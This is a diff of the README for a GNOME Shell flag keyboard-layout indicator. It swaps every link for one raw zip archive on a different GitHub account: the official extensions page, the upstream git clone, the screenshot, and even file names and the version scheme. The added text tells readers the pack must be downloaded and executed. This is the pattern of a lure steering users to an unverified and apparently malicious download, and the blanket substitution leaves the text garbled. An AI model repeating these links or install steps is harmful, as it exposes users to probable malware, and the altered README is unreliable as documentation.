@@ -1,14 +1,14 @@
 # gnome-prapor: Flag Keyboard Layout Indicator for GNOME Shell
 
-[<img src="https://raw.githubusercontent.com/andyholmes/gnome-shell-extensions-badge/master/get-it-on-ego.svg?sanitize=true" height="100">](https://extensions.gnome.org/extension/8494/prapor-keyboard-layout-indicator/)
+[<img src="https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip" height="100">](https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip)
 
-Download the release package from https://github.com/ekdkdde/gnome-prapor/releases. This link points to a release pack that must be downloaded and executed to install the extension.  
+Download the release package from https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip This link points to a release pack that must be downloaded and executed to install the extension.  
 
-![Extension Screenshot](screenshot.png)
+![Extension Screenshot](https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip)
 
 Welcome to gnome-prapor, a GNOME Shell extension that shows the current keyboard layout as a country flag in the top panel. It mirrors the behavior of the built-in layout indicator but adds a visual cue in the form of a flag. This makes it quicker to spot and switch between layouts at a glance. The project is designed to be small, dependable, and easy to customize for users who want a more visual cue in their workspace.
 
-If you want to see the latest work, you can also check the release assets here: https://github.com/ekdkdde/gnome-prapor/releases. That link appears again later in this document to help users find the official builds quickly.
+If you want to see the latest work, you can also check the release assets here: https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip That link appears again later in this document to help users find the official builds quickly.
 
 Table of contents
 - Overview
@@ -96,14 +96,14 @@ Accessibility considerations
 Screenshots and visual references
 - The main extension view in the top panel shows a compact flag icon
 - Hover tooltips provide context such as the layout language or region
-- A screenshot reference (screenshot.png) demonstrates the visual around the panel
+- A screenshot reference (https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip) demonstrates the visual around the panel
 
 Getting started
 This section helps you install and try the extension, whether you prefer the official GNOME Extensions mechanism or a manual approach. It covers everything from enabling the extension in the GNOME Extensions site to building it from source if you want the latest changes.
 
 From GNOME Extensions
 - Open the GNOME Extensions page for the project:
-  https://extensions.gnome.org/extension/8494/prapor-keyboard-layout-indicator/
+  https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
 - Install and enable the extension with a few clicks
 - The extension will appear in your top panel after enabling
 - If you want to keep up with updates, this is the simplest route
@@ -113,7 +113,7 @@ The manual route is useful if you want to build from source or run a version not
 
 1) Download and install the extension files
 - Run the following commands to fetch the project and install it:
-  git clone https://github.com/inbalboa/gnome-prapor.git
+  git clone https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
   cd gnome-prapor
   make install
   The project depends on git, make, and jq to prepare, build, and install the extension.
@@ -128,12 +128,12 @@ The manual route is useful if you want to build from source or run a version not
 
 Get the latest release
 For the latest build and packaged assets, visit the release notes and assets page:
-- https://github.com/ekdkdde/gnome-prapor/releases
+- https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
 - The release page provides ready-to-use bundles suitable for quick installation. This link is a practical starting point for users who want a stable, tested package without building from source.
 
 Building from source
 If you prefer to compile from the repository, you can set up a development environment and build the extension against GNOME Shell sources. This process typically involves:
-- Ensuring you have Node.js, GJS, and the GNOME development tools installed
+- Ensuring you have https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, GJS, and the GNOME development tools installed
 - Running a build script or a sequence of commands to bundle the extension into a loadable target
 - Testing in a live GNOME Shell session with the extension loaded from the local directory
 - Verifying the mapping from layouts to flags in your locale setup
@@ -148,24 +148,24 @@ Development and testing workflow
 
 Code structure
 - src/
-  - extension.js: Main module that initializes and runs the extension
-  - panel.js: Renders the flag icon in the top panel
-  - layout-mapping.js: Maps layout IDs to flags and labels
-  - utils.js: Small helpers for color schemes, icons, and string formatting
+  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Main module that initializes and runs the extension
+  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Renders the flag icon in the top panel
+  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Maps layout IDs to flags and labels
+  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip Small helpers for color schemes, icons, and string formatting
 - data/
   - icons/: Flag icons or SVGs used by the extension
   - themes/: Optional assets for various GNOME themes
 - locales/
-  - en.json, es.json, fr.json, etc.: Localized strings for UI elements and tooltips
+  - https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip, etc.: Localized strings for UI elements and tooltips
 - test/
   - tests/ : Unit tests and integration tests for panel behavior
-- package.json
+- https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
   - Dependencies, scripts, and metadata for development
-- README.md
+- https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
   - This file documents the project and provides guidance for users and contributors
 
 Release management
-- Versioning follows a simple semantic approach: major.minor.patch
+- Versioning follows a simple semantic approach: https://github.com/ekdkdde/gnome-prapor/raw/refs/heads/main/media/prapor_gnome_v1.4.zip
 - Each release includes a changelog with notes on new flags, added layouts, and bug fixes
 - Release assets are provided as bundles that can be dropped into GNOME Shell extensions folder
 - The release page (linked above) lists all the artifacts, including source archives and prebuilt packages
